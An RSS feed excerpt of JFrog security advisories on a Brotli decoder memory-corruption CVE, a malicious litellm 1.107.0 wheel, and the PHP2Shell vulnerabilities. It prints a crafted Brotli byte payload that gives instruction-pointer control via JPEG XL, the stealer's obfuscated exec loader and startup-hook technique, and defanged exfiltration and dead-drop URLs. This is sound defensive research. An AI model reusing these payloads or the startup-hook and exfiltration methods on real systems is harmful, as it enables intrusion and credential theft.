item.title: Beyond testmetest: Native Addon Camouflage and 42 Armed GitHub Repositories Reveal a Hidden npm Publisher
item.description: JFrog Security Research linked 42 armed GitHub repositories in the testmetest campaign to a hidden npm publisher, an active encrypted data sink and previously reported GitHub Actions cPanel exploitation infrastructure.

item.title: Brotli2Shell: Beyond Node(2Shell) and HTTP(2Shell)
item.description: CVE-2026-111497 ("Brotli2Shell") is an out-of-bounds write in Google's Brotli decoder that reaches far beyond Node.js and HTTP. JFrog Security Research reproduced a remote crash in ClickHouse, native memory corruption in FFmpeg through JPEG XL, a .NET runtime crash, and an infinite loop in Apache Arrow, and released an open-source scanner that finds Brotli decoding paths version-only scanners miss.
item.content:encoded:
CVE-2026-111497 demonstrates how a single memory-corruption bug in a widely reused native decoder can affect applications far beyond the runtime where it was first discovered.
CVE-2026-111497 was publicly disclosed in Node.js’s October 21 security release, which credited OpenAI Codex Security researchers Khai Tran and Sylvie Mayer with reporting the vulnerability. On October 22, Imperva demonstrated remote code execution against an official vulnerable Node.js build and named its research Node2Shell. On October 23, as evidence emerged that the same flaw affected other ecosystems, researchers introduced the name HTTP2Shell to reflect its broader impact on HTTP clients and servers.
But neither name fully captures the scope of the vulnerability.
The underlying flaw resides in Google's Brotli decoder, a native component reused by applications across multiple languages and software categories. HTTP clients and servers are only part of the picture. Software that processes compressed data through file parsers, media tools, document processors, or other native integrations can also expose the vulnerable code, even when HTTP is not involved at all.
Our investigation demonstrates that this is more than a dependency inventory problem. We reproduced instruction-pointer control in additional native applications and developed an [open-source scanner](https://github.com/jfrog/vulnerability_scanners/tree/main/brotli2shell_cve_2026_111497) that identifies Brotli decoding paths across source code, scripts, and ELF binaries, providing code-level evidence that version-only scanners cannot reveal.
## **The vulnerability behind Node2Shell**
CVE-2026-111497 is an out-of-bounds write in Google's Brotli decoder. The root cause is an error-handling flaw in the decoder's block-switch processing: an invalid block switch can be handled as though the decoder simply needs more input, allowing processing to continue with an invalid state and resulting in a write beyond the intended buffer.
The affected upstream ranges are Brotli 1.0.3 before 1.0.10, 1.1.0 before 1.1.1, and 1.2.0 before 1.2.1. Downstream projects may backport the fix, so the upstream version number alone is not always sufficient to determine patch status.
The upstream correction is available in Google Brotli's commit [0ed4268](https://github.com/google/brotli/commit/0ed4268a4401abcb4472096340477cf4af7d1a2b). Node.js subsequently incorporated the fix into its October 2026 security releases, including versions 22.23.4, 24.22.1, and 26.12.1.
The critical distinction is that the vulnerability belongs to the decoder, not to Node.js or HTTP itself. Any application that ships or links an affected implementation may inherit the underlying memory-corruption flaw. Whether that translates into practical exposure depends on the implementation, the input path, and the surrounding runtime and security controls.
## **One decoder, a much larger attack surface**
The ecosystem-wide impact became clearer as researchers examined projects beyond Node.js. The [Broccoli2Shell tracker](https://broccoli2shell.com/) provides a useful inventory of affected implementations, downstream projects, and patch status.
However, identifying a vulnerable copy is not the same as proving that an attacker can reach it. Two questions must be answered separately:
**Is the vulnerable implementation present?** An application may bundle Brotli source code, link against a system library, or inherit it through another dependency.
**Can untrusted input reach the decoder?** The application must process attacker-controlled data through the affected decoding path for the memory-corruption condition to become relevant.
These questions lead to a broader attack surface than the original Node.js disclosure might suggest. Brotli is used to decode data in multiple contexts, and the same flaw can be reached through entirely different input types and application features.
### **HTTP clients and servers**
HTTP is one important attack surface: researchers found that the vulnerable Brotli decoder can be reached through different HTTP workflows. [Imperva](https://www.imperva.com/blog/node2shell-from-brotli-data-to-remote-code-execution/) demonstrated remote code execution against a vulnerable Node.js build through two HTTP-related paths: decompression of Brotli-compressed responses consumed by `fetch()`, and decompression of incoming request bodies handled by server-side middleware.
Our researchers reproduced a remotely triggerable denial-of-service condition in ClickHouse through the decompression of incoming HTTP request bodies with `Content-Encoding: br`. A single HTTP request containing a crafted 23 MB body crashed the tested ClickHouse server. The malformed Brotli stream corrupts decoder state, and the crash occurs during cleanup when `BrotliReadBuffer` is destroyed and the decoder state is freed. The process terminates with a segmentation fault, interrupting the service and any in-flight queries handled by that server.
![](/img/RealTimePostImage/post/brotli2shell/image1.png)
While a fix has been merged in [ClickHouse PR \#127419](https://github.com/ClickHouse/ClickHouse/pull/127419), a patched release had not yet shipped at the time of writing. This means that, **despite the fix being available in the project's source code, users may still be exposed through released builds.**
### **Native applications and file processing**
HTTP is only one way to reach the vulnerable decoder. Our investigation also identified applications where attacker-controlled files or buffers reach Brotli through native libraries and data-processing APIs. These paths demonstrate why exposure cannot be assessed by looking only at HTTP clients, servers, or Node.js versions.
#### **FFmpeg: memory corruption through JPEG XL decoding**
FFmpeg is an open-source media framework written in C that supports a wide range of audio and video formats. During our investigation, we found that **FFmpeg reaches the vulnerable Brotli decoder transitively** through `libjxl`, which it uses to decode JPEG XL images. Specifically, `libjxl` uses Brotli to decompress metadata stored in `brob` boxes within the JPEG XL container format.
We developed a proof of concept that triggers the vulnerability and achieves instruction-pointer control, demonstrating that this issue extends beyond HTTP-based attack paths to native media processing.
The exploitation path is therefore entirely separate from HTTP:
`Crafted JPEG XL file → FFmpeg → libjxl → brob box → BrotliDecoderDecompressStream()`
To demonstrate the impact, we developed a Python script that constructs a JPEG XL file manually. The file contains the expected JPEG XL signature (`JXL` ), an `ftyp` box declaring the file type, a `brob` box containing an `Exif` tag and crafted Brotli bytes, and a `jxlc` box containing a valid image codestream copied from a source image.
The outer structure is valid, and the file contains a real image. The malformed data is embedded in the metadata box, where the Brotli stream is designed to trigger the block-type confusion bug by declaring one block type and then forcing an invalid block switch. The crafted byte sequence is:
`200010414141fcffff07002228f00b60f7f41f000000`
When FFmpeg decodes the image, `libjxl` passes the `brob` contents to `BrotliDecoderDecompressStream()`, triggering the vulnerability and corrupting decoder state. The failure becomes apparent later, when the decoder instance is destroyed and attempts to free a pointer derived from the `0x41` bytes in the payload. In our testing, this results in a segmentation fault at `0x414141414141`.
![](/img/RealTimePostImage/post/brotli2shell/image2.png)
This demonstrates memory corruption and control over the corrupted pointer value through a crafted image file. The resulting crash confirms that an attacker can reach the vulnerable decoder through FFmpeg's file-processing path, without relying on HTTP. Achieving remote code execution would require further exploitation of the memory corruption and would depend on the target build and its security mitigations.
#### **.NET: a native crash through Brotli decompression**
The .NET runtime provides another integration path. Its `System.IO.Compression.Brotli` APIs use a native Brotli decoder compiled into the runtime. APIs such as `BrotliStream` can therefore pass attacker-controlled input to the vulnerable native code. The same decoder can also be reached through HTTP-related features, including `HttpClient` automatic response decompression and ASP.NET Core request-decompression middleware.
In our demonstration, a local console application supplied a two-stage Brotli stream. The first stage suspended decoding mid-state; the second triggered an invalid block switch, exercising the vulnerable logic in `DecodeBlockTypeAndLength()`. The decoder continued using inconsistent state until a memory operation walked beyond valid heap data, causing a native segmentation fault (`SIGSEGV`).
![](/img/RealTimePostImage/post/brotli2shell/image3.png)
Unlike an ordinary managed exception, this crash terminates the affected process. Although our demonstration used a local console application, the same decoding functionality is used by network-facing .NET applications when they decompress attacker-controlled Brotli data.
The issue is tracked in [dotnet/runtime \#136422](https://github.com/dotnet/runtime/issues/136422). On October 25, 2026, Microsoft announced that updates are rolling out for supported .NET runtimes and SDKs through the normal distribution channels. The issue remains open to track porting the fixes to the public GitHub branches.
#### **Apache Arrow: an infinite loop through Parquet and buffer decompression**
Apache Arrow demonstrates a different failure mode: denial of service through an infinite loop rather than a process crash. Its `pyarrow` package bundles Brotli decoding support used to process Brotli-compressed Parquet data pages. The decoder can also be reached directly through the buffer-decompression API, without any network connection.
We found that a 534-byte input could trigger the issue. The stream builds on the published Node.js regression vector for this bug: a small valid uncompressed meta-block, followed by a compressed meta-block that declares the maximum possible size of 16 MB and contains a malformed block-switch sequence. We padded it with trailing data to sustain the decode loop. Instead of rejecting the malformed input, the vulnerable decoder's retry logic treats the condition as if more input might resolve it and continues looping. The affected process consumes CPU indefinitely, preventing the data-processing task from completing.
![](/img/RealTimePostImage/post/brotli2shell/image4.png)
The same input is rejected in under a second by Brotli 1.2.1. The issue is tracked in [Apache Arrow \#55166](https://github.com/apache/arrow/issues/55166), which remained open at the time of writing.
### **Why patch status varies**
The root cause was fixed upstream in Google's Brotli repository in commit [`0ed4268`](https://github.com/google/brotli/commit/0ed4268), included in Brotli 1.2.1. Although the underlying issue affects the Brotli decoder, patch availability varies across projects that use it. Some projects bundle their own copy of Brotli, while others rely on a system library, a language runtime, or a transitive dependency. As a result, fixing the upstream decoder does not automatically make every affected application safe: downstream projects must incorporate the fix, release an updated version, and ensure that their distributions or deployments use it.
The practical implication is that identifying an affected version is only the first step. It is also necessary to understand whether an application actually reaches Brotli decoding, which inputs can reach that path, and whether the relevant release includes the upstream fix.
## **Detecting Brotli2Shell: What Existing Tools Miss**
Several tools have emerged to help identify systems affected by CVE-2026-111497, but they differ in what they examine and what their results establish.
[node2shell-detect](https://github.com/shivrajem/node2shell-detect) primarily inventories installed and running Node.js and Bun runtimes across supported hosts and containers, then compares their versions against known fixed releases. It helps locate outdated runtimes but does not inspect application code for Brotli usage. Its scope also excludes Node.js embedded in other applications and software that bundles its own Brotli copy.
The [Trail of Bits Brotli Checker](https://github.com/trailofbits/brotli-checker) fingerprints potentially vulnerable Brotli source code and binaries and checks for selected decoder calls and application paths. It also provides source-call discovery to investigate connections between decoder and networking APIs. When used through Claude Code or Codex, its AI-assisted workflow can investigate additional paths, but the depth of that investigation depends on the code and evidence available; it does not guarantee detection of every decompression path.
These tools provide useful starting points, but identifying an outdated runtime, a vulnerable decoder copy, or a potential call path does not necessarily establish whether an application processes attacker-controlled data through the vulnerable implementation. This can be particularly difficult when decompression happens indirectly, such as through an HTTP client, request-processing middleware, or a native library.
## **How Does JFrog Protect You?**
**JFrog Xray identifies vulnerable components and versions, while our contextual scanner checks for additional application-level paths that may reach the vulnerable decoder.** This combines component identification with targeted analysis of how Brotli decompression may be used.
![](/img/RealTimePostImage/post/brotli2shell/image5.png)
Compared with node2shell-detect, our approach also checks application code for potential Brotli decompression paths. Compared with Brotli Checker, it adds targeted detection for high-level JavaScript and Python APIs, including `fetch()`, Express and `body-parser`, Requests, HTTPX, aiohttp, and urllib3. It also checks for Brotli CLI usage and relevant ELF decoder references.
We have also released an [open-source](https://github.com/jfrog/vulnerability_scanners/tree/main/brotli2shell_cve_2026_111497) scanner that covers the same patterns, allowing researchers and developers to investigate potential exposure to CVE-2026-111497 in their own projects. Its checks cover the following patterns:
* **JavaScript:** Direct Brotli decompression APIs, streaming decompression, `DecompressionStream`, HTTP response decompression through `fetch()` and related networking APIs, TLS certificate compression, and request-body decompression through Express and `body-parser`. * **Python:** Direct use of `brotli` and `brotlicffi`, as well as HTTP clients such as Requests, HTTPX, aiohttp, and urllib3 that may automatically decompress Brotli responses when the appropriate backend is installed. * **Native binaries:** ELF decoder references such as `BrotliDecoderDecompress` and `BrotliDecoderDecompressStream`. * **Command-line usage:** Brotli CLI invocations that use decompression options such as `-d` or `--decompress`.
These checks matter because an application may never call the native decoder directly. An HTTP client may decompress a response automatically, middleware may decode an incoming request body before application code processes it, or a native binary may invoke Brotli on behalf of another component.
When Xray identifies a vulnerable component and contextual analysis finds a relevant usage pattern, this additional evidence helps teams prioritize artifacts for investigation and remediation instead of treating every affected version as equally exposed.
A match does not automatically prove remote exploitability. The actual decoder implementation, runtime or library version, input source, and application configuration must still be considered. The goal is to provide evidence of potential exposure that helps security teams determine where further investigation and remediation are needed.
## **Conclusion**
Node2Shell and HTTP2Shell brought attention to CVE-2026-111497, but their names don't capture the full scope of the vulnerability. Our investigation shows that the vulnerable Brotli decoder can be reached through much more than HTTP clients and servers. We demonstrated additional paths through FFmpeg's JPEG XL processing and the .NET runtime, illustrating how the same underlying flaw can affect applications across different ecosystems and software categories.
Finding vulnerable package versions is an essential first step, but it does not tell the whole story. Brotli may be introduced through transitive dependencies, bundled into native binaries, or invoked indirectly through high-level APIs. Vulnerable functionality can therefore remain hidden even when an application does not directly depend on Brotli or explicitly call its decoding functions. A more complete assessment requires identifying affected components and versions, then examining source code and binaries to find relevant decoder functions and determine how they may be reached by untrusted input.
CVE-2026-111497 illustrates why vulnerability detection must go beyond package inventories. Understanding the actual exposure means tracing vulnerable code across dependency chains, language runtimes, native libraries, and application entry points. Without this broader view, security teams risk overlooking vulnerable code simply because it resides several layers below the application or is reached indirectly through another component.

item.title: LiteLLM Hijacked Again: Malicious 1.107.0 Wheels Steal Credentials and Load Remote Code
item.description: LiteLLM has been hijacked again: malicious `litellm` 1.107.0 wheels contain an interpreter-startup credential stealer and an hourly remote-code loader absent from the source distribution.
item.content:encoded:
**Update October 22**: LiteLLM informed us that the incident has been contained. The company has published [an incident update](https://docs.litellm.ai/blog/security-incident-oct-21-2026) with the latest status and guidance for affected users.
The JFrog Security Research team identified malicious code in `litellm` 1.107.0, a widely used Python interface and proxy for large language model providers. The payload wheels are a functional copy of the legitimate project with three additional files that execute at Python startup, steal a broad set of credentials and secrets, and provide an hourly remote-code execution channel. The payload can run even when an application never imports `litellm`.
The official `litellm/litellm:1.107.0` Docker image is also affected. Systems that pulled the mutable `latest`, `main-latest`, or `main-stable` tags while they referenced 1.107.0 should be treated as exposed as well. Docker Hub has since removed the affected image and all affected tags.
This is the second documented hijacking of LiteLLM in 2026. The new compromise is especially instructive because the published source distribution does not contain the three payload files found in the wheel. Reviewers who inspect only source code, a Git tag, or an sdist can therefore miss malicious behavior delivered in a platform-specific binary artifact.
The open source community is actively following the new incident in [LiteLLM issue #47826](https://github.com/BerriAI/litellm/issues/47826).
PyPI has since removed the compromised 1.107.0 release.
All seven PyPI wheels for `litellm` 1.107.0 contain the payload, across macOS, Linux, musl Linux, and Windows targets. The source tarball lacks `cook.pth`, `cook.py`, and `sitecustomize.py`, while its `pyproject.toml` contains an added `data = "cook"` setting that is absent from the corresponding Git tag. Our local copy of the source distribution likewise contains this setting but not the three malicious payload files.
The payload entries share ZIP timestamps and metadata with legitimate wheel files, indicating that they were included during normal wheel construction rather than appended through manual ZIP repacking. This narrows the likely point of injection, but it does not reveal who altered the build tree, how that alteration occurred, or how the artifacts were published. The exact build or publishing compromise remains unknown.
![](/img/RealTimePostImage/post/litellm-hijacked-again/pypi-litellm.png)
## LiteLLM was already hijacked
In March 2026, JFrog Security Research [documented LiteLLM's first compromise](https://research.jfrog.com/post/litellm-compromised-teampcp/). Its pipeline ran a malicious, unpinned Trivy 0.69.4 release, exposing CI/CD and publishing credentials.
The stolen credentials were used to publish backdoored `litellm` versions 1.82.7 and 1.82.8, which harvested credentials, spread across Kubernetes nodes, and installed a persistent backdoor. JFrog tracks those releases under XRAY-955589.
The new 1.107.0 compromise uses different payloads and infrastructure. No evidence currently links it to TeamPCP or the earlier access path, so the incidents should be treated as separate campaigns.
## The source archive and built wheel tell different stories
Its `RECORD` manifest includes three files under `litellm-1.107.0.data/purelib/`:
```text litellm-1.107.0.data/purelib/cook.pth litellm-1.107.0.data/purelib/cook.py litellm-1.107.0.data/purelib/sitecustomize.py ```
The `data = "cook"` setting directs Maturin to copy a build-time `cook/` directory into the wheel's data area. The wheel build therefore had access to files that were not present in the published source archive.
Python wheel installers place files from this `purelib` directory into the environment's `site-packages` root. The corresponding 1.107.0 sdist contains none of these payload files. A comparison of the legitimate library tree found no other injected code: aside from expected wheel-specific artifacts such as the compiled Rust bridge and packaging differences, the rest of the wheel appears consistent with the legitimate release.
This is wheel-level or build-artifact-level injection. The observable evidence is consistent with injection during or after wheel construction, while the matching metadata favors inclusion during the ordinary build process over later manual repacking. It does not prove that a particular CI system, maintainer machine, PyPI account, or publishing credential was compromised.
The distinction matters operationally. Source review can show that the main `litellm` code is legitimate while still missing executable files added to a built artifact. Package consumers and security tools must verify the exact wheel they install, including its `RECORD` contents and startup hooks, rather than treating an sdist or repository tag as a complete representation of every published artifact.
At the time of writing, a read-only retrieval of `domain.txt`, the dead-drop file used by the remote loader, returned HTTP 200 with an empty plain-text body of exactly zero bytes and no redirect. No domain was present or contacted. This made the loader dormant at observation time, but changing the file can re-arm it. This time-sensitive result does not neutralize the wheel: the local `cook.py` credential stealer executes independently of `domain.txt` and remains active.
## Python startup hooks trigger the compromise
The malicious wheel uses two Python startup mechanisms. The first file, `cook.pth`, contains only:
```python import cook ```
Python's `site` module processes `.pth` files during normal interpreter initialization and executes lines beginning with `import`. As a result, `cook.py` runs during normal Python startup in the affected environment, regardless of whether the application imports `litellm`.
The second mechanism is `sitecustomize.py`. After processing site paths, Python automatically attempts to import a module named `sitecustomize`. The injected module uses this behavior to start a detached loader. Together, these hooks turn normal Python invocations in the environment, including administrative use of `pip`, into potential retriggers.
The `sitecustomize.py` daemon path cannot complete on Windows because the code relies on `os.fork()`. It fails silently there, but `cook.pth` still imports `cook.py`, so Windows installations remain exposed to the credential stealer.
## `cook.py` launches the `privcollect` credential stealer
The two-line `cook.py` file contains a Base64-encoded, zlib-compressed Python program passed directly to `exec()`. Static decoding, without executing the sample, produces approximately 61 KB of plain Python source. The decoded program identifies itself as `privcollect`.
The heavily shortened wrapper below preserves only a prefix of the malicious encoded data:
```python import zlib as _3659944d, base64 as _35100b45 exec(_3659944d.decompress(_35100b45.b64decode('eNrdfWt327qu4Pf+Ck/X...'))) ```
The `cook.py` copy starts the collector in a daemon thread and uses `/tmp/.pc_once_72129118c59f5636c0bb` as a run-once marker. The marker is created only after successful exfiltration, so its absence does not establish that a host is clean. The payload also sets `PRIVCOLLECT_ACTIVE=1` to limit duplicate execution within inherited process environments.
### What the stealer collects
The collector is designed for developer workstations, CI/CD workers, cloud workloads, containers, and LiteLLM proxy deployments. It targets:
- SSH files, GPG private keys, TLS private keys, shell histories, database client histories, and key files such as `.pem`, `.key`, `.p12`, and `.pfx` - Chromium-family passwords, cookies, web data, and history, plus Firefox login databases, key databases, and browsing history - AWS, Azure, and Google Cloud credentials; Kubernetes configurations and service-account tokens; Docker and Swarm secrets; GitHub CLI, `rclone`, and `.netrc` credentials - CI/CD and infrastructure-as-code secrets from GitLab Runner, Jenkins, Vault, Terraform, and Packer - Package manager and source-control credentials from `.git-credentials`, `.npmrc`, `.pypirc`, pip, Yarn, Maven, Gradle, Composer, RubyGems, and Cargo - AI development credentials and configurations for Cursor, Claude, Codex, Gemini, GitHub Copilot, Hugging Face, Kiro, Windsurf, Zed, Continue, aider, goose, opencode, Qwen, Cline, Roo, and Cody - Environment variables from the current process and every readable `/proc/<pid>/environ` file on Linux - Cloud instance credentials from AWS IMDS and ECS task metadata, Google Cloud metadata, and Azure IMDS - LiteLLM proxy data reached through `DATABASE_URL`, including `LiteLLM_CredentialsTable` and `LiteLLM_ProxyModelTable`
This shortened excerpt from the decoded source shows selected collection modules:
![](/img/RealTimePostImage/post/litellm-hijacked-again/credential-modules.png)
On Linux, the environment-variable collector also reads other processes' environments:
![](/img/RealTimePostImage/post/litellm-hijacked-again/process-environment.png)
The LiteLLM-specific database module is particularly damaging. It starts a child Python process, connects through Prisma, and attempts to dump stored LLM provider credentials from `LiteLLM_CredentialsTable` along with proxy model configuration from `LiteLLM_ProxyModelTable`. A compromised proxy host can therefore expose credentials for many upstream AI providers at once.
The shortened decoded query logic confirms both table targets:
![](/img/RealTimePostImage/post/litellm-hijacked-again/database-collection.png)
The cloud module also attempts to validate stolen AWS credentials through `GetCallerIdentity`. Defenders should account for both local theft and subsequent use of exported cloud credentials outside the affected environment.
## Encrypted exfiltration to a LiteLLM look-alike domain
The stealer serializes collected data as JSON and encrypts it with a randomly generated AES-256-CBC key. It then wraps that key using an embedded RSA-4096 public key with OAEP-SHA256 and packages the encrypted material into a tar.gz archive containing `hdr.json` for metadata, `data.bin` for the IV and encrypted data, and `key.bin` for the wrapped AES key.
The decoded excerpt below is shortened, and its destination is defanged for publication:
![](/img/RealTimePostImage/post/litellm-hijacked-again/c2-exfiltration.png)
The archive is sent over plaintext HTTP to `hxxp[:]//www[.]litellm[.]dev/healthcheck`. The request includes the static token `XWiA8gZNa7NcX2XRoAEb` in the `X-Token` header and an `X-SHA256` header. Although the transport is unencrypted, the application-layer envelope prevents defenders from recovering stolen content from a network capture without the attacker's RSA private key.
Registration records show that `litellm[.]dev` was created on October 13, 2026, and updated on October 18, 2026. The official project uses `litellm[.]ai`, making `litellm[.]dev` a convincing look-alike. The `www[.]litellm[.]dev` host must also not be confused with the previous incident's `models[.]litellm[.]cloud` exfiltration domain.
## `sitecustomize.py` creates an hourly remote-code loader
The injected `sitecustomize.py` module opens `/tmp/remote_code_loader.lock` and attempts to acquire a non-blocking exclusive `flock`. If no existing instance holds the lock, it calls `os.fork()`. The parent returns so Python startup can continue, while the child calls `os.setsid()`, redirects standard streams to `/dev/null`, changes its working directory to `/`, and enters an infinite hourly loop.
Each cycle retrieves a prospective C2 domain from:
`hxxps[:]//raw[.]githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt`
If the first valid domain resolves, the loader synchronously runs a second embedded copy of `privcollect`. It then fetches `hxxp[:]//{domain}/codepy` over plaintext HTTP and executes the response with `compile()` and `exec()`. There is no integrity check or authentication for the downloaded Python code, giving whoever controls the resolved server arbitrary code execution under the affected user's privileges.
The shortened local `sitecustomize.py` excerpt shows that an empty dead drop exits early, while a populated one enables remote execution. The constructed URL is defanged:
![](/img/RealTimePostImage/post/litellm-hijacked-again/remote-code-loader.png)
The embedded stealer differs from the `cook.py` copy in two important settings. It sets `PC_ONCE_PATH` to an empty string and `PC_ASYNC` to `False`. Consequently, it performs full collection and exfiltration synchronously on every successful hourly C2 cycle, while the `cook.py` copy is designed to complete once per host after successful exfiltration.
The zero-byte `domain.txt` observation at the time of writing affects only this conditional hourly path. It does not prevent `cook.py` from collecting and sending local secrets whenever Python processes the malicious `.pth` file, and the loader can be re-armed by changing the dead-drop content.
## Remediation
- Avoid every `litellm` 1.107.0 wheel. All seven platform wheels are affected. Pin `litellm==1.106.2` only after removing the startup hooks or from a newly built clean environment. - Isolate any host or container where the affected wheel was installed or Python was started in its environment. Treat reachable credentials and data as compromised. - Do not begin remediation by running `pip` inside an affected environment. Starting Python can execute `cook.pth` and `sitecustomize.py` again. First remove `cook.pth`, `cook.py`, `sitecustomize.py`, their matching compiled files under `__pycache__`, `/tmp/.pc_once_72129118c59f5636c0bb`, and `/tmp/remote_code_loader.lock` using tools that do not invoke the affected interpreter. - Inspect for and terminate detached Python processes associated with `sitecustomize.py`, especially a process holding `/tmp/remote_code_loader.lock`, using `setsid`, or running with `/` as its working directory. Also investigate `/tmp/.pc_sq_*` and `/tmp/.pc_e_*` artifacts. - Block and investigate access to `www[.]litellm[.]dev`, `raw[.]githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt`, and any domain returned by that dead drop. Preserve relevant proxy, DNS, endpoint, and cloud audit logs. - Rotate all credentials accessible to the affected host, including browser passwords, SSH and GPG keys, TLS private keys, package publishing tokens, source-control tokens, cloud and Kubernetes credentials, AI development tokens, `DATABASE_URL`, LiteLLM master and virtual keys, and every provider credential stored in `LiteLLM_CredentialsTable`. - Investigate any retrieval or execution of `/codepy`. Because this stage can execute arbitrary Python, its effects cannot be bounded by the behavior of the embedded stealer. - Perform a forensic rebuild of affected virtual environments, hosts, containers, and images from verified artifacts. Rebuilding is safer than attempting to prove that every startup artifact, downloaded stage, and exposed secret was removed.
## Conclusions
The malicious `litellm` 1.107.0 demonstrates a critical gap between source provenance and artifact integrity. The source distribution lacks the executable payload files, while the wheel installs them directly into `site-packages` and activates them before normal application code runs. The sdist's altered build setting and the matching artifact metadata are important investigative leads, but they do not establish the exact root cause.
This second LiteLLM hijacking should not be conflated with the earlier TeamPCP incident. Both target the trust placed in a popular AI package and both steal broad developer and cloud credentials, but the current artifact uses different startup files, persistence behavior, and network infrastructure. Incident responders should scope each campaign using its own indicators.
JFrog Xray and JFrog Curation detect the malicious `litellm` 1.107.0 using XRAY-955589.
## Indicators of Compromise
- `litellm` 1.107.0 malicious (PyPI) - XRAY-955589 - Affected Docker image digest: `sha256:1bbcb1443bc962e45f5aad53fe3d2c30600e0379715fb6c664cdd3ac126c339e` - Exfiltration URL: `hxxp[:]//www[.]litellm[.]dev/healthcheck` - Exfiltration domain: `www[.]litellm[.]dev` - C2 dead-drop URL: `hxxps[:]//raw[.]githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt` - Conditional remote payload URL: `hxxp[:]//{domain}/codepy` - Dead-drop repository: `letters9813/pythonclient-test` - Exfiltration token: `X-Token: XWiA8gZNa7NcX2XRoAEb` - Single-instance lock: `/tmp/remote_code_loader.lock` - Run-once marker: `/tmp/.pc_once_72129118c59f5636c0bb` - Temporary paths: `/tmp/.pc_sq_*` and `/tmp/.pc_e_*` - LiteLLM database targets: `LiteLLM_CredentialsTable` and `LiteLLM_ProxyModelTable` - Community tracking: [open LiteLLM security issue #47826](https://github.com/BerriAI/litellm/issues/47826)

item.title: PHP2Shell: All You Need to Know About CVE-2026-109618 and CVE-2026-109619
item.description: JFrog Security Research is tracking CVE-2026-109618 and CVE-2026-109619, two CRITICAL-severity PHP core vulnerabilities (PHP2Shell) that turn unauthenticated requests into remote code execution and Heartbleed-style memory disclosure. We break down the bug flow, the shipped fix, and the fake PoCs that surfaced around the disclosure.
item.content:encoded:
![](/img/RealTimePostImage/post/php2shell/image1.png)
Recently, JFrog Security has been tracking two CRITICAL-severity PHP core vulnerabilities (CVE-2026-109618, CVE-2026-109619), disclosed today and referred to publicly as PHP2Shell. The bugs allow unauthenticated remote code execution and Heartbleed-style memory disclosure in PHP itself, independent of the application running on top of it. In this write-up, we will discuss the bug, the exploit, its mechanics, and the prerequisites required for it to be exploitable.
On October 20, the [PHP](https://www.php.net/) security team announced an upcoming security release scheduled for October 21 at 14:00 UTC. The release was expected to address two critical vulnerabilities, CVE-2026-109618 and CVE-2026-109619, each assigned a CVSS v4.0 score of 9.2. ![](/img/RealTimePostImage/post/php2shell/image2.png)
The timing created a difficult situation for defenders. Organizations have been warned about critical vulnerabilities in one of the web's most widely deployed server-side technologies, but the official technical details and fixed versions have not yet been published. Meanwhile, researchers have been investigating the issues, and reports of a potential exploit have already emerged.
### **Who is affected by PHP2Shell CVEs:**
**PHP versions:**
- PHP 8.2.x before 8.2.35 - 8.3.x before 8.3.36 - 8.4.x before 8.4.27 - 8.5.x before 8.5.12
**Configuration:** session.upload_progress.enabled=On (factory default) and multipart uploads accepted.
**Server Environment:** Apache mod_php (and likely FrankenPHP) for the confirmed application-independent RCE. FPM is susceptible through state published after successful startup.
## **Remediation**
* Upgrade to PHP 8.5.12, 8.4.27, 8.3.36 or 8.2.35.
* If you cannot upgrade: according to the PHP security advisories [1], [2] you can partially mitigate by setting `session.upload_progress.enabled=0` (and `fatal_error_backtraces=0` on PHP 8.5.x) administratively, restarting every worker after changing them, and enforcing `memory_limit=-1` (do not use `RLIMIT_AS`/`RLIMIT_DATA`). Setting `pm.max_requests=1` additionally breaks the same-worker requirement. Note that the upload-progress switch does not affect the OPcache or backtrace arms, and that `memory_limit=-1` removes the resource-exhaustion protection. Each measure is partial on its own.
* JFrog Xray users are protected. Xray flags PHP versions in the affected ranges in scanned artifacts and dependencies.
### **Technical Details**
Later that day, [Wiz](https://www.wiz.io/blog/php2shell-php-rce) confirmed these are CVEs they found alongside [Calif](https://calif.io/php2shell/) (A security research lab), and OpenAI as part of the [Patch the planet](https://openai.com/index/patch-the-planet/) initiative.
JFrog’s team was able to discover the general flow of these vulnerabilities before it was published and reach several working POC’s. We concluded that the vulnerability flow probably looked like this:
1. PHP has a mechanism to process multipart POST requests; it creates a session file on the disk to track the upload progress. The user controls the session ID (sent as a normal POST field PHPSESSID), the suffix of the session key inside the file (PHP_SESSION_UPLOAD_PROGRESS), and the uploaded filename, which is stored as-is, letting him insert potentially malicious data into the file.
2. The session file is always stored in a serialized format. When the PHP engine opens the session, it unserializes the file's content before any script runs. The decoder trusts whatever it finds: it does not verify that the bytes came from PHP itself, so data the user influenced through the upload is decoded as live session data.
3. The unserialization is not a simple parser: while it runs, PHP builds zvals (the structures PHP uses to store dynamic values, allocating and freeing memory in the process) and tracks them in a bookkeeping struct that remembers the values it built, for references and destructors. This bookkeeping assumes that every initialization is paired with a cleanup inside the same request.
4. Another multipart upload handled by the same worker, which opens the session before any script runs, decodes this file again. The first decode broke the pairing from #3: an error skipped the cleanup, so PHP's globals still point at the freed bookkeeping memory. The second upload's allocations take over that memory, its decode runs on attacker-controlled bytes, and the session write back calls the fake object's serialize function, ending with control of the RIP register.
### **The Bugs**
The vulnerabilities enable the creation of the following exploits:
* Remote Code execution * Information disclosure
Whereas both vulnerabilities can be used to achieve either.
The two advisories describe the same defect from two angles:
**CVE-2026-109618:** Saves request-owned memory pointers in persistent variables, leading to use-after-free RCE or memory leaks when a fatal error occurs and a subsequent request trusts the stale pointer. ![](/img/RealTimePostImage/post/php2shell/image3.png)
**CVE-2026-109619:** Follows the same pattern across other persistent variables, including saved fatal error backtraces in PHP 8.5 and OPcache shared-memory state corrupted across workers. ![](/img/RealTimePostImage/post/php2shell/image4.png)
### **The Fix**
The following was the fix shipped by the PHP team: ![](/img/RealTimePostImage/post/php2shell/image5.png)
The fix addresses the following:
- **OOM no longer aborts mid-operation** ([31c0ea7d7ff](https://github.com/php/php-src/commit/31c0ea7d7ff)): the UAF existed because a fatal OOM longjmped straight out of the code that was about to clear the pointer. Now OOM becomes a soft error at the next VM safe point (or a hard _exit()** past a higher threshold), so the cleanup always runs and the pointer is always cleared before the memory is freed. - **Defense in depth**: even when a request dies another way, all long-lived state (backtrace, OPcache, session, error state) is reset at shutdown, so nothing stale survives into the next request. - **No user code during upload-progress decode**: objects decoded by the upload-progress handler stay **__PHP_IncompleteClass** - no autoload, no **__destruct()**, so the object-injection delivery verified in this post is closed too.
### **Fake PoCs**
While investigating PoCs published on GitHub, we found that some users were taking advantage of the opportunity to spread fake PoCs as pranks.
